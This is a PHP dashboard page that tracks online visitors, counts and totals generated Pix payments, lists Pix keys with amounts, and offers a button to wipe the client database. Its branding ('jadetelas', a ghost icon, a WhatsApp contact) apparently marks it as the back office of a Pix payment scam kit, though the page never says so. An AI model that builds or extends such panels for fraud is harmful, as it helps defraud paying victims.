<?php 
include "../config/config.php";
include "../classcoderphp/pix.php";


date_default_timezone_set('America/Sao_Paulo');

global $pdo;
$ip = $_SERVER['REMOTE_ADDR'];
$hora = date('H:i:s');

$sql = "SELECT * FROM acessos WHERE hora > :hora GROUP BY ip";
$sql = $pdo->prepare($sql);
$sql->bindValue(":hora", date('H:i:s', strtotime("-5 minutes")));
$sql->execute();
$contagem = $sql->rowCount();

$sql = "SELECT * FROM relatorio";
$sql = $pdo->prepare($sql);
$sql->execute();
$relatorio = $sql->rowCount();

$sql = "SELECT * FROM visitas_produto";
$sql = $pdo->prepare($sql);
$sql->execute();
$pix = $sql->rowCount();

$array2=[];
$sql = "SELECT valorpix FROM visitas_produto";
$sql = $pdo->prepare($sql);
$sql->execute();
if($sql->rowCount() > 0){
   $array2 = $sql->fetchAll();
}




$sql = $pdo->prepare("DELETE FROM acessos WHERE hora < :hora");
$sql->bindValue(":hora", date('H:i:s', strtotime("-2 minutes")));
$sql->execute();

$array1=[];
$sql=$pdo->prepare("SELECT *  FROM coderphp_cliente ORDER BY id DESC LIMIT 2");
$sql->execute();
if($sql->rowCount() > 0){
   $array1 = $sql->fetchAll();
}
$total11 = 0;
foreach($array2 as $valorotalpix):

 $total11 += $valorotalpix['valorpix'];
endforeach;


$pixgerador = new Pix();
$pixok = $pixgerador->listarpixpainel();






?>


<div  class="content p-1 grande " >
  
  <div class="list-group-item  bg-dark ">
    <div class="d-flex">


    </div>

    <div class="container-fluid" id="setTime">
     <div class="row">
      <div class="col-md-3">
        <div class="relatorio js-tilt" style='cursor:pointer;'>
          <span data-tilt></span>
         <p><i class="fa-solid fa-globe"></i> Online <br> <span><?= $contagem ?></span> </p>

       </div>
     </div>

     <div class="col-md-3">
      <div class="relatorio1 js-tilt" style='cursor:pointer;'>
       <p><i class="fa-brands fa-pix"></i> Pix gerado  <span><?= $pix ?></span> </p>
          <span style='text-align: center;'>Total de pix <br>  <?=  'R$ '. number_format(@$total11 , 2, ',', '.');  ?></span>
           
     </div>
   </div>

   <div class="col-md-3">
    <div class="relatorio2 js-tilt" style='cursor:pointer;'>
     <p><i class="fa-solid fa-user"></i> Acesso <br> <span><?= $relatorio  ?></span>  </p>

   </div>
 </div>

 <div class="col-md-3">
  <div class="relatorio3 js-tilt" style='cursor:pointer;'>
   <p> <i class="fa-solid fa-ghost"></i> jadetelas <br> <span><a target="_blank" href="https://wa.me/5516994911710"><i class="fa-brands fa-whatsapp"></i></a></span> </p>

 </div>
</div>

</div>

<div class="row">
   <div class="col-md-8" style="margin-top:20px;">
<div  style="border-radius:6px;padding:10px;color:rgb(8, 163, 54);background:rgb(27, 27, 27);width: 600px;
  height: 200px;
  overflow: auto;">

  <?php 
 
foreach($pixok as $coderphp):

?>

  <p>
<?= $coderphp['chavepix'] ?>
<span style="color:red;"> $ <?= number_format(@$coderphp['valorpix'] , 2, ',', '.')?> </span>
<hr>
  </p>
<?php endforeach;
?>
  



</div>
 
</div>
</div>



</div>




<!-- CLIENTES -->
<br><br>


<div style="width:100%;height:auto;padding:20px;background:white;border-radius:4px;">
  
   <div class="row">
      

     <div class="col-md-4">
     
       <div class="row">

     

       


       </div>
     </div>




     

       <div class="col-md-4">
          <p><strong>Funções</strong></p>
       <div class="row">
          <div class="col-md-6">
         <div style="cursor:pointer;width:100%;height:auto;padding:10px;border-radius:4px;">
            <button onclick="window.location.href='limparbanco'" type="button" class="btn btn-danger">Limpar o banco de dados clientes</button> <br>
            
           
         </div>
      </div>

    

      
       </div>
     </div>
   </div>
</div>

</div>




</div>



</div>


</div>
</div>

</div>